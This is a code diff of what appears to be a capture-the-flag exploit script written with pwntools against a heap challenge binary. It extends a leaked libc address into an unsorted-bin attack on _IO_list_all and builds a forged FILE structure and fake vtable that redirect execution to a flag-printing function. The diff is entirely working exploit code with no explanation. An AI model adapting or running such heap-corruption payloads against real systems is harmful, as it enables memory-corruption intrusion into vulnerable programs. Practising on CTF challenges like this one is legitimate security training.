@@ -22,7 +22,7 @@ def reintroduce(data):
 
 
 data = 0x602040
-read_flag = 0x400cc4
+print_flag = 0x400cc4
 
 introduce(flat([
     p64(0), p64(0x61), p64(0)
@@ -41,10 +41,28 @@ reintroduce(fake_chunk)
 free_chunk(5)
 reintroduce(b'A' * 0x15 + b' \n')
 r.recvuntil(b'\n\n')
-libc_leak = u64(r.recvline().strip(b'!\n').ljust(8, b'\x00'))
-libc = libc_leak - 88 - 0x3c4b20
+libc_main_arena_88 = u64(r.recvline().strip(b'!\n').ljust(8, b'\x00'))
+libc = libc_main_arena_88 - 88 - 0x3c4b20
 libc_freehook = libc + 0x3c67a8
+libc_io_list_all = libc + 0x3c5520
 pop_rdi = libc + 0x400d83
-print(hex(libc))
-
+reintroduce(flat([
+    p64(0), p64(0x61), p64(libc_main_arena_88), p64(libc_io_list_all-0x10)
+]))
+add_chunk(0x58, '')
+payload = p64(0)
+payload += p64(0x61)
+fake_file = b'flag.txt\x00'
+fake_file = fake_file.ljust(0x20, b'\x00')
+fake_file += p64(0)
+fake_file += p64(1)
+fake_file = fake_file.ljust(0xc0, b'\x00')
+fake_file += p64(0)
+fake_file = fake_file.ljust(0xd8, b'\x00')
+fake_file += p64(data + 0x10 + 0xd8)
+fake_vtable = p64(0) * 3
+fake_vtable += p64(print_flag)
+payload += fake_file + fake_vtable
+print(hex(len(payload)))
+reintroduce(payload)
 r.interactive()
